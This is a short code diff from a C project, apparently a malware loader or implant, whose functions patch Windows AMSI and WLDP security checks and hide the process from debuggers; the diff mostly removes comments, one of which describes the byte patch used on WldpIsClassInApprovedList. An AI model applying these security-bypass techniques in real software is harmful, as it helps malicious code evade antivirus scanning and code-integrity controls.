@@ -58,8 +58,11 @@ bool DefenseCheckDebugger(void) {
         return true;
     }
 
+    
+
     MiseryLog(MISERY_LOG_INFO, "DefenseCheckDebugger: Environment clean");
     return false;
+    
 }
 
 
@@ -270,7 +273,7 @@ bool DefensePatchAMSI(void) {
 }
 
 
-// DefensePatchWLDP – xor eax,eax / ret on WldpIsClassInApprovedList
+// DefensePatchWLDP 
 
 bool DefensePatchWLDP(void) {
     HMODULE hWldp = GetModuleHandleA("wldp.dll");
@@ -323,7 +326,7 @@ bool DefensePatchWLDP(void) {
 }
 
 
-// DefenseHideFromDebugger – ProcessDynamicEHContinuationTarget (0x11) 
+// DefenseHideFromDebugger
 bool DefenseHideFromDebugger(void) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return false;
